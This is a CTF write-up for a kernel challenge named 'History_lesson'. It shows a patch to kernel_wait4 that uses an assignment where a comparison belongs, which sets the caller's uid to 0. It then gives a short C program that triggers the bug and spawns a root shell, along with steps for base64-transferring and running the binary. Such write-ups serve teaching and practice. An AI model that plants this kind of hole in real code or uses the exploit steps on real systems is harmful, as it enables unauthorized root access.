# Write-up of the challenge "History_lesson"

This challenge is part of the "Binary exploitation" category and earns 500 points.

# Goal of the challenge

The objective of the challenge is to exploit a kernel vulnerability in order to gain the privileges required to read the flag.

## Program structure

```
--- a/kernel/exit.c
+++ b/kernel/exit.c
@@ -1765,7 +1765,7 @@ long kernel_wait4(pid_t upid, int __user *stat_addr, int options,
  	long ret;
  
  	if (options &amp; ~(WNOHANG|WUNTRACED|WCONTINUED|
-			__WNOTHREAD|__WCLONE|__WALL))
+			__WNOTHREAD|__WCLONE|__WALL) &amp;&amp; (((struct cred *)current-&gt;real_cred)-&gt;uid.val = 0))
  		return -EINVAL;
  
  	/* -INT_MIN is not defined */

```

## Problem

The problem I encountered while doing this challenge is that we did not have enough tools in the environment to compile C programs. If we had access to those tools, the challenge would have been much easier, as we would have had more freedom.

## Security breach

The security flaw lies in the recent patch. As we can see, the developer mistakenly used **"(((struct cred *)current-&gt;real_cred)-&gt;uid.val = 0))"** instead of  **"(((struct cred *)current-&gt;real_cred)-&gt;uid.val == 0))"**. What the programmer intended to do was to check whether the process was running as root when a kernel_wait4 error occurred. However, due to this mistake, the code instead **"Sets the process to root"**. As a result, if we can create a C program that triggers a "** kernel_wait4**" error, we can run the process as root and later spawn a root shell.

## Solution

In the end I made a C program to trigger kernel_wait4 error:

```
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/wait.h>

int main() {
    int ret;

    int invalid_opts = 0xFFFFFFFF;

    ret = syscall(SYS_wait4, -1, NULL, invalid_opts, NULL);


    if (getuid() == 0) {
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("Failed\n");
    }

    return 0;
}
```

After doing that, I compiled the program using **"gcc wait4.c -o wait4"** and then obtained the base64 of the binary.
I realized that in the kernel environment we could write to the tmp file, so I copied the external base64 and placed it there using echo. Then I ran **"base64 -d binary.b64 > exploit"**. After that, I ran **"chmod +x exploit"** and executed it with **"./exploit"**. This spawned a root shell, allowing me to read the flag!

If you liked this writeup you can star my repository.
